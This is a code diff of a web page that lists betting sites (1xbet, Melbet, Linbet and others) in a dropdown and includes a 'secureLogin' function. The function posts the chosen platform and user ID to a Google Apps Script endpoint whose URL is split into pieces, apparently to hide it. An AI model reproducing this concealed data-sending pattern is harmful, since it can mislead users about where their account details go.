@@ -89,25 +89,25 @@
           </svg>
         </button>
         <ul id="dropdownList" class="absolute z-10 w-full bg-white dark:bg-gray-700 border rounded-xl mt-1 hidden max-h-60 overflow-y-auto text-sm text-gray-800 dark:text-white">
-          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="a1">
-            منصة 1
-            <img src="https://i.postimg.cc/xdy6d0h9/charge.jpg" alt="P1" class="w-6 h-6 rounded-full">
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Mega pari">
+            Mega pari
+            <img src="https://i.postimg.cc/xdy6d0h9/charge.jpg" alt="Mega pari" class="w-6 h-6 rounded-full">
           </li>
-          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="a2">
-            منصة 2
-            <img src="https://i.postimg.cc/xCgWJjwv/recharge.jpg" alt="P2" class="w-6 h-6 rounded-full">
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Linbet">
+            Linbet
+            <img src="https://i.postimg.cc/xCgWJjwv/recharge.jpg" alt="Linbet" class="w-6 h-6 rounded-full">
           </li>
-          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="a3">
-            منصة 3
-            <img src="https://i.postimg.cc/J4CVthdk/recharge.jpg" alt="P3" class="w-6 h-6 rounded-full">
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Gooobet">
+            Gooobet
+            <img src="https://i.postimg.cc/J4CVthdk/recharge.jpg" alt="Gooobet" class="w-6 h-6 rounded-full">
           </li>
-          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="a4">
-            منصة 4
-            <img src="https://i.postimg.cc/7ZT29mnc/recharge.png" alt="P4" class="w-6 h-6 rounded-full">
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="1xbet">
+            1xbet
+            <img src="https://i.postimg.cc/7ZT29mnc/recharge.png" alt="1xbet" class="w-6 h-6 rounded-full">
           </li>
-          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="a5">
-            منصة 5
-            <img src="https://i.postimg.cc/1t3bhntk/recharge.jpg" alt="P5" class="w-6 h-6 rounded-full">
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Melbet">
+            Melbet
+            <img src="https://i.postimg.cc/1t3bhntk/recharge.jpg" alt="Melbet" class="w-6 h-6 rounded-full">
           </li>
         </ul>
         <input type="hidden" id="platform" name="platform" />
@@ -185,10 +185,10 @@
   }
 
   function getRealScriptURL() {
-    const p1 = "https://script";
-    const p2 = ".google.com/macros/s/";
-    const p3 = "AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA";
-    return p1 + p2 + p3 + "/exec";
+    const a = "https://script";
+    const b = ".google.com/macros/s/";
+    const c = "AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA";
+    return a + b + c + "/exec";
   }
 
   function secureLogin() {
@@ -215,9 +215,7 @@
     localStorage.setItem("platform", platform);
     localStorage.setItem("userId", userId);
 
-    const url = getRealScriptURL();
-
-    fetch(url, {
+    fetch(getRealScriptURL(), {
       method: "POST",
       mode: "no-cors",
       headers: { "Content-Type": "application/json" },
